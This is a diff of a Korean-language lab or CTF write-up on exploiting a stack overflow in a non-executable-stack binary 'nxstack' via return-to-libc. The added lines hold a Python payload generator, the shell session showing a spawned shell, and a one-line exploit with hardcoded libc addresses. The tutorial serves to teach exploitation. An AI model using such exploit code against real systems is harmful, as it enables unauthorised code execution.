@@ -152,6 +152,7 @@ system() return address = BBBB (fake word) or exit() \
 현재로써는 대충 fake값인 BBBB로 설정해두었다. 또는 `0xb7e457f0`으로 exit()를 EIP부분에 넣으면 좋다.
 
 ## Exploit code
+파이썬을 사용하여 Exploit code를 만들어보았다.
 ```
 from struct import *
 
@@ -172,6 +173,28 @@ payload += pack("<Q", binsh_addr)            # /bin/sh addr
 
 f = open("in.txt", "w")
 f.write(payload)
+```
+이 프로그램을 실행하면 in.txt 라는 파일을 생성한다.
+```
+$ python nx.py
+$ ls -l in.txt
+-rw-r--r-- 1 skcctf skcctf 60 Jun 27 00:01 in.txt
+```
+이를 cat으로 출력시키면서 바로 nxstack 바이너리의 arg로 전달하자.
+```
+$ ./nxstack `cat in.txt`
+-bash: warning: command substitution: ignored null byte in input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@��W��H�
+$ whoami
+cpuu
+$ exit
+```
+쉘이 획득되었음을 볼 수 있다. 종료할 때에도 별다른 오류 로그가 남지 않는다. 
+
+방금의 exploit은 한줄로 다음과 같이 처리할 수도 있다.
+
+```
+$ ./nxstack "$(python -c 'print "A"*36 + "\x40\x1b\xe5\xb7" + "\xf0\x57\xe4\xb7" + "\xc8\x48\xf7\xb7"')"
 ```
 
 
